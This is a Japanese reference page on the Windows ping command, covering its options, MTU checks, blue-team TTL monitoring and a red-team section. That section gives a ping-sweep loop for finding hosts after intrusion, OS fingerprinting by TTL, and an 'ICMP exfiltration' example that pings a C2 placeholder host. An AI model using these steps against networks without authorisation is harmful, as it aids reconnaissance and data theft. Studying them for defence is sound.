# Command - Windows - cmd - ping - ネットワーク疎通の確認

## 概要

`ping` (Packet InterNet Groper) は、ICMP (Internet Control Message Protocol) の "Echo Request" パケットを対象のホストに送信し、"Echo Reply" が返ってくるかを確認することで、ネットワーク上の疎通状態を診断するツールです。

応答の有無、応答時間（レイテンシ）、パケットの損失率を確認することで、接続品質を測定します。

(出自: `Windows 標準搭載 - TCP/IP ユーティリティ`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| `Test-Connection` | PowerShell 版。より詳細なプロパティを取得でき、スクリプトでの条件分岐に使いやすい。 | PS 環境 |
| `fping` | Linux 等で利用。複数のホストに対して並列で ping を打てる。 | (Linux環境) |
| `hping3` | Linux 等で利用。ICMP 以外（TCP/UDP）でも ping のような疎通確認が可能。 | 高度な調査 |

## よく連携されるコマンド

### シナリオ例: ネットワーク内の生存ホストの高速スキャン (偵察視点)

* **目的**: 特定のサブネット内に存在する「生きている」端末をリストアップする。
* **連携コマンド**: `for`, `ping`, `arp`
* **解説**: 1回だけ ping を送信 (`-n 1`) し、応答があったものだけを画面に出力、または ARP キャッシュに登録させます。
* **コマンド例**:
    ```cmd
    REM 192.168.1.1-254 までの範囲で生存確認を行う
    for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL" && echo 192.168.1.%i is UP
    ```

## スイッチ/オプション説明

| スイッチ | 説明 |
| :--- | :--- |
| ⭐ `-t` | 中断されるまで継続して ping を送信する（`Ctrl+C` で停止）。 |
| `-n count` | 送信するパケットの回数を指定（デフォルトは 4）。 |
| `-l size` | 送信パケットのサイズを指定（デフォルトは 32バイト）。MTU の調査に使用。 |
| ⭐ `-f` | パケットの分割（フラグメンテーション）を禁止する。`/l` と組み合わせて MTU 調査に使用。 |
| ⭐ `-i TTL` | TTL (Time To Live) 値を指定する。 |
| `-a` | アドレスをホスト名に解決する（逆引き）。 |
| `-w timeout` | 各応答を待機するタイムアウト時間をミリ秒単位で指定。 |
| `-4` / `-6` | IPv4 または IPv6 の使用を強制する。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: ネットワークのパス上の MTU (Maximum Transmission Unit) を調査する。
* **解説**: パケット分割禁止 (`-f`) スイッチを使い、パケットサイズ (`-l`) を徐々に大きくして、どこでエラー（Packet needs to be fragmented）が出るかを確認します。
* **例**:
    ```cmd
    REM パケットサイズ 1472バイト（+IP/ICMPヘッダ=1500）で分割禁止送信
    ping -f -l 1472 8.8.8.8
    ```

### 2. ブルーチーム視点

* **タスク**: TTL の変化によるネットワーク経路変更や偽装の検知。
* **解説**: 普段返ってくる TTL の値が突然大きく変わった場合、通信経路の変更や中間者攻撃（MITM）の可能性があります。
* **例**:
    ```cmd
    REM 特定のサーバーへの ping を継続し、TTL の安定性を監視
    ping -t 192.168.1.1
    ```

### 3. レッドチーム視点 (ネットワークスキャンと列挙)

- **タスク 1: Host Discovery (Ping Sweep / 生存確認)**
    - **目的**: 侵入したセグメント内に存在する他の「生きている」ホストを特定する。Nmap等の外部ツールが持ち込めない環境での第一選択肢。
    - **解説**: Windows標準の `for` ループを使用し、応答（TTLを含む文字列）があった場合のみIPアドレスを表示させます。`-w 100`（タイムアウト100ms）を指定することで、スキャン時間を大幅に短縮します。
    - **コマンド例**:

        ```cmd
        REM 192.168.1.1 から 254 までを高速スキャンし、生存ホストをリストアップ
        for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL" && echo 192.168.1.%i is UP
        ```
        
    - **実務ログ例**:

        Plaintext

        ```Plaintext
        192.168.1.1 からの応答: バイト数 =32 時間 <1ms TTL=255
        192.168.1.1 is UP
        192.168.1.10 からの応答: バイト数 =32 時間 =1ms TTL=128
        192.168.1.10 is UP
        192.168.1.50 からの応答: バイト数 =32 時間 =12ms TTL=64
        192.168.1.50 is UP
        ```
        
- **タスク 2: OS Fingerprinting (TTLによるOS推測)**
    - **目的**: ターゲットに対して本格的な攻撃を仕掛ける前に、相手が Windows か Linux かを判別する。
    - **解説**: ICMP応答パケットのデフォルト **TTL (Time To Live)** 値を確認します。OSごとに初期値が異なるため、ここからターゲットの性質を推測できます。
    - **推測基準**:

        | 応答TTL値 | 推測されるOS / デバイス | 備考 |

        | :--- | :--- | :--- |

        | **64 付近** | **Linux / macOS** | サーバーやIoT機器に多い。 |

        | **128 付近** | **Windows** | クライアントPCやActive Directory関連。 |

        | **255 付近** | **Cisco 等のネットワーク機器** | ルーターやL3スイッチ。 |

    - **コマンド例**:

        ```cmd
        REM ターゲットのOSを推測するために1回だけpingを送信
        ping -n 1 192.168.1.10
        ```
        
    - **実務ログ例**:

        ```Plaintext
        192.168.1.10 からの応答: バイト数 =32 時間 =1ms TTL=127
        REM 考察: TTLが127（初期値128から1ホップ通過）であるため、ターゲットは Windows と推測可能。
        ```
        
- **タスク 3: ICMP Exfiltration (データ漏洩 / トンネリング)**
    - **目的**: ファイアウォールでTCP/UDPが厳しく制限されている環境で、ICMPパケットのデータ領域を利用して情報を持ち出す。
    - **解説**: `-l` スイッチを使用して、パケットのサイズ（ペイロード）を意図的に大きくします。高度な攻撃では、このデータ領域に機密情報をエンコードして埋め込みます。
    - **コマンド例**:

        ```cmd
        REM 1000バイトのダミーデータ（または埋め込みデータ）を送信
        ping -l 1000 <C2_Server_IP>
        ```
        
    - **実務ログ例**:

        ```Plaintext
        <C2_Server_IP> に ping を送信しています 1000 バイトのデータ:
        <C2_Server_IP> からの応答: バイト数 =1000 時間 =45ms TTL=52
        ```
        
    - **補足**: パケットキャプチャ（Wireshark等）で見ると、通常 `abcdefg...` と続くデータ領域が不自然なバイナリデータになっている場合、トンネリングが疑われます。

## エラーメッセージとトラブルシューティング

1. **エラーメッセージ例 1**: `Request timed out.` (要求がタイムアウトしました。)
    
    - **考えられる原因**: 相手がダウンしている。または相手のファイアウォールで ICMP がブロックされている。
    - **解決策**: 他のプロトコル（TCP 等）での疎通を試みる。
        
2. **エラーメッセージ例 2**: `Destination host unreachable.` (宛先ホストに到達できません。)
    
    - **考えられる原因**: ルーティングテーブルに経路がない。またはゲートウェイ先でルートが途切れている。
    - **解決策**: `tracert` でどこまで届いているかを確認する。
        
3. **エラーメッセージ例 3**: `Packet needs to be fragmented but DF set.`
    
    - **考えられる原因**: 送信サイズが経路上にある機器の MTU を超えている。
    - **解決策**: パケットサイズ (`-l`) を下げる。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

- **Ping of Death**: 規格外に巨大なパケットを送りつけ、システムをクラッシュさせる攻撃（現代の OS では対策済み）。
- **ICMP Exfiltration**: ICMP パケットのデータ領域に機密情報を埋め込み、ファイアウォールを抜けて外部へ持ち出す手法。

## 注意点・補足

- **最近のセキュリティ傾向**: セキュリティ上の理由から、多くのサーバーやファイアウォールでは `ping` (ICMP) への応答を無効にしています。`ping` が通らないからといって、そのサーバーが動いていないとは限りません。
- **名前解決**: `ping hostname` と打つことで、DNS が正しく引けているかの確認にもなります。
